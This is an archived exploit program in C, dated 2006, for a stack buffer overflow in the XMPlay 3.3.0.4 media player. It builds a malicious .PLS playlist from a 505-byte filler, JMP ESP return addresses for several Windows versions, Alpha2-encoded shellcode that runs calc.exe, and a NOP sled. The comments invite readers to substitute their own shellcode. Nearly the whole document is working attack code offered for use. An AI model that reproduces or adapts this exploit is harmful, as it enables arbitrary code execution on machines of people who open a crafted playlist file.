<html><head><title>XMPlay 3.3.0.4 (PLS) Local/Remote Buffer Overflow Exploit</title></head><pre>/*
===================================================================
	0-day XMPlay 3.3.0.4 .PLS Filename Buffer Overflow Exploit
===================================================================
XMPlay 3.3.0.4 and lower experiance a stack-based buffer overflow when
loading malformed M3U and PLS files (probably ASX files as well -
working on the ASX Exploit as we speak).

This merely executes CALC.exe but you could always add your own custom
shellcode (alpha2)

===============
PLS Format
[playlist]
File1=C:\[BUFFER][JMP][SHELLCODE][NOPSLED][Extension]
Title1=title (could also be used for the buffer overflow exploit)

ESP Stores Address of Shellcode


Huge Greets and Thanks to Expanders (expanders[at]gmail[dot]com)
Who I presented the PoC and Discovery to for the original M3U exploit
He wrote the first PoC Exploit for it.

And Jerome Athias for some neat tools.  Both of these
guys are very talented, keep up the good work.

Reported Exploit Date: 11/21/2006

*/


#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
int main(int argc, char *argv[])
{

	FILE *Exploit;
	char buffer[512];
	char *outp;

	/* Executes Calc.exe Alpha2 Shellcode Provided by Expanders &lt;expanders[at]gmail[dot]com&gt; */
	unsigned char scode[] =
	&quot;TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI&quot;
	&quot;YlHhQTs0s0c0LKcuwLLK1ls52Xs1JONkRofxNkcoUpUQZKCylK4tLKuQxnTqo0LYnLMTkpptUWiQ9ZdM&quot;
	&quot;5QO2JKZT5k2tUtUTPuKULKQOfDc1zKPfNkflrkNkSowlvaZKLK5LlKgqxkMYqL14wtYSFQkpcTNkQPtp&quot;
	&quot;LEiPd8VlNkqPVllKPp7lNMLK0htHjKuYnkMPnP7pc05PLKsXUlsovQxvU0PVOy9hlCo0SKRpsXhoxNip&quot;
	&quot;sPu8LX9nMZvnv79oM7sSU1rLsSdnu5rX3UuPA&quot;;



	char NOPSled[50];
	char tail[] = &quot;.mid\r\n&quot;;
	int JMP, x;

	printf(&quot;\n======================================================================\n&quot;);
	printf(&quot;XMPlay 3.3.0.4 and prior PLS Filename Buffer Overflow Exploit\n&quot;);
	printf(&quot;Discovered and Coded By: Greg Linares &lt;GLinares.code[at]gmail[dot]com&gt;\n&quot;);
	printf(&quot;Usage: %s &lt;output PLS file&gt; &lt;JMP&gt; [Exploit Display Name] \n&quot;, argv[0]);
	printf(&quot;\n JMP Options\n&quot;);
	printf(&quot;1 = English Windows XP SP 2 User32.dll &lt;JMP ESP 0x77db41bc&gt;\n&quot;);
	printf(&quot;2 = English Windows XP SP 1 User32.dll &lt;JMP ESP 0x77d718fc&gt;\n&quot;);
	printf(&quot;3 = English Windows 2003 SP0 and SP1 User32.dll &lt;JMP ESP 0x77d74adc&gt;\n&quot;);
	printf(&quot;4 = English Windows 2000 SP 4 User32.dll  &lt;JMP ESP 0x77e3c256&gt;\n&quot;);
	printf(&quot;====================================================================\n\n\n&quot;);


	if (argc &lt; 2) {
		printf(&quot;Invalid Number Of Arguments\n&quot;);
		return 1;
	}


	Exploit = fopen(argv[1],&quot;w&quot;);
    if ( !Exploit )
    {
        printf(&quot;\nCouldn't Open File!&quot;);
        return 1;
    }

	memset(buffer, 0, 505);
	memset(NOPSled, 0, 20);


	fputs(&quot;[playlist]\r\n&quot;, Exploit);
	fputs(&quot;File1=&quot;, Exploit);
	fputs(&quot;C:\\&quot;, Exploit);

	for (x=0;x&lt;505;x++) {
		strcat(buffer, &quot;A&quot;);
	}

	fputs(buffer, Exploit);
	if (atoi(argv[2]) &lt;= 0) {
		JMP = 1;
	} else if (atoi(argv[2]) &gt; 4) {
		JMP = 1;
	} else {
		JMP = atoi(argv[2]);
	}
	switch(JMP) {
		case 1:
			printf(&quot;Using English Windows XP SP2 JMP...\n&quot;);
			fputs(&quot;\xbc\x41\xdb\x77&quot;, Exploit);
			break;
		case 2:
			printf(&quot;Using English Windows XP SP1 JMP...\n&quot;);
			fputs(&quot;\xfc\x18\xd7\x77&quot;, Exploit);
			break;
		case 3:
			printf(&quot;Using English Windows 2003 SP0 &amp; SP1 JMP...\n&quot;);
			fputs(&quot;\xdc\x4a\xd7\x77&quot;, Exploit);
			break;
		case 4:
			printf(&quot;Using English Windows 2000 SP 4 JMP...\n&quot;);
			fputs(&quot;\x56\xc2\xe3\x77&quot;, Exploit);
			break;
	}

	fputs(scode, Exploit);

	for (x=0;x&lt;20;x++) {
		strcat(NOPSled, &quot;\x90&quot;);
	}

	fputs(NOPSled, Exploit);
	fputs(tail, Exploit);
	if (strlen(argv[4]) &gt; 0) {
		fputs(&quot;Title1=&quot;, Exploit);
		fputs(argv[4], Exploit);
		fputs(&quot;\r\n&quot;, Exploit);
	} else {
		fputs(&quot;Title1=XMPlay_0-Day_PLS_Buffer_Overflow_Exploit_By_Greg_Linares\r\n&quot;, Exploit);
	}

	fputs(&quot;Length1=512&quot;, Exploit);

	printf(&quot;Exploit Succeeded...\n Output File: %s\n\n&quot;, argv[1]);


	printf(&quot;Exploit Coded by Greg Linares (GLinares.code[at]gmail[dot]com)\n&quot;);
	printf(&quot;Greetz to: Jerome Athias and Expanders - Thanks For The Ideas, Tools and Alpha2 Shell Code\n&quot;);

	fclose(Exploit);
	return 0;
}

// milw0rm.com [2006-11-21]</pre></html>